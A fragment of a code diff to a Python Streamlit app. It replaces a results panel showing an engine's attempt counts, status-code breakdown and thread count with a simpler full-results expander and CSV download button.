-            engine = st.session_state.engine
-            
-            col_stats1, col_stats2, col_stats3 = st.columns(3)
-            col_stats1.metric("Total Attempts", engine.total_attempts)
-            col_stats2.metric("Status Codes", len(engine.status_codes))
-            col_stats3.metric("Threads", max_workers)
-            
-            if engine.status_codes:
-                with st.expander("Status Code Breakdown"):
-                    st.dataframe(pd.DataFrame(list(engine.status_codes.items()), columns=["Code", "Count"]))
-            
-            if engine.results:
-                df = pd.DataFrame(engine.results)
-                with st.expander("Detailed Results"):
-                    st.dataframe(df)
-                
-                csv = df.to_csv(index=False)
-                st.download_button("Download Results CSV", csv, "results.csv", "text/csv")
-        
-        if st.button("🔄 New Analysis"):
-            st.session_state.state = "idle"
-            st.session_state.results_df = pd.DataFrame()
-            st.session_state.logs = []
-            st.session_state.success = None
-            st.rerun()
+        if hasattr(st.session_state, "engine") and st.session_state.engine.results:
+            with st.expander("📊 Full Results"):
+                df_full = pd.DataFrame(st.session_state.engine.results)
+                st.dataframe(df_full, use_container_width=True)
+                csv = df_full.to_csv(index=False)
+                st.download_button("Download CSV", csv, "results.csv", "text/csv")
 
 if __name__ == "__main__":
     main()
